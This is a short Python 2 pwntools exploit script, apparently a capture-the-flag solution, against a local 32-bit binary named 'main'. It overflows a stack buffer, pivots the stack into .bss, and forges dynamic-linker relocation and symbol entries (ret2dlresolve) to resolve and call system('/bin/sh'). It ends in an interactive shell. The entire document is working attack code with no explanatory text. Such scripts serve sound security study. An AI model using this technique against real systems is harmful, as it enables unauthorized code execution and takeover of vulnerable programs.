from pwn import *

p = process('./main')
elf = ELF('main')

write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
read_got = elf.got['read']
ppp_ret = 0x08048619
bss_addr = elf.bss()
base_addr = bss_addr + 0x800
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458

plt_addr = 0x08048380
str_addr = 0x08048278
sym_addr = 0x080481d8
rel_plt = 0x08048330

payload = 'A'*112 + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_addr)
payload += p32(100) + p32(pop_ebp_ret) + p32(base_addr) + p32(leave_ret)
p.recvuntil('~!\n')
p.sendline(payload)

payload2 = 'AAAA'
payload2 += p32(plt_addr)
payload2 += p32(base_addr + 20 - rel_plt)
payload2 += 'AAAA'
payload2 += p32(base_addr + 80)
payload2 += p32(0x804A00C) + p32(0x26907)
payload2 += 'AAAAAAAAAAAA'
payload2 += p32(base_addr + 14*4 - str_addr) + p32(0) + p32(0) + p32(0x12)
payload2 += 'system' + p32(0)
payload2 += 'a'*(80 - len(payload2))
payload2 += '/bin/sh\x00'
payload2 += 'a'*(100 - len(payload2))
p.send(payload2)

p.interactive()
